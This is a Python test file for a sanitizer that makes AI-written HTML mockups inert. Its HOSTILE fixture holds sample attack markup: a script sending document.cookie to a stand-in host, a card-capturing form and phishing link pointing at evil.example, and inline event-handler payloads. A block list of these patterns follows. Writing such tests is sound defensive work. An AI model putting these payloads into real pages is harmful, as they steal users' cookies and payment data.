"""Anaya's mockups are model-written HTML shown to the founder: they must be made inert."""

from app.features.blueprints.mockup import sanitize_mockup

HOSTILE = """```html
<!doctype html>
<html><head>
<title>Menu</title>
<meta http-equiv="refresh" content="0;url=https://evil.example">
<link rel="stylesheet" href="https://evil.example/x.css">
<base href="https://evil.example/">
<style>
@import url("https://evil.example/y.css");
.screen { background: url(https://evil.example/beacon.png); color: #333; border-radius: 12px; }
</style>
<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>
</head><body onload="alert(1)">
<div class="screen" onclick="steal()" style="padding:8px">
  <h1>Chai Stall</h1>
  <a href="javascript:alert(1)">Order</a>
  <a href="https://evil.example/phish">Pay now</a>
  <img src="https://evil.example/pixel.gif" onerror="alert(2)">
  <iframe src="https://evil.example/frame"></iframe>
  <form action="https://evil.example/post"><input name="card"><button>Pay ₹40</button></form>
  <object data="https://evil.example/x"></object><embed src="https://evil.example/y">
  <video src="https://evil.example/v.mp4"></video>
</div>
</body></html>
```"""


def test_scripts_frames_forms_handlers_links_and_outside_loads_are_all_removed() -> None:
    clean = sanitize_mockup(HOSTILE).lower()

    for gone in (
        "<script",
        "evil.example",
        "javascript:",
        "onclick",
        "onload",
        "onerror",
        "<iframe",
        "<form",
        "<object",
        "<embed",
        "<video",
        "<link",
        "<base",
        "<meta http-equiv",
        "@import",
        "url(",
        "```",
        " src=",
        " href=",
    ):
        assert gone not in clean, gone
    assert "chai stall" in clean and "pay ₹40" in clean  # the content is kept
    assert "border-radius: 12px" in clean and "padding:8px" in clean  # and so is the styling


def test_a_fragment_without_a_page_gets_one() -> None:
    page = sanitize_mockup("<div><h1>Menu</h1><button>Order</button></div>")
    assert page.startswith("<!doctype html>") and "<html" in page and "<h1>Menu</h1>" in page


def test_text_with_no_markup_becomes_an_honest_page_never_an_empty_frame() -> None:
    page = sanitize_mockup("I could not draw these <3")
    assert "couldn't be drawn" in page and "I could not draw these &lt;3" in page


def test_a_complete_page_keeps_its_doctype_once() -> None:
    page = sanitize_mockup("<!doctype html><html><body><p>Hi</p></body></html>")
    assert page.lower().count("<!doctype") == 1
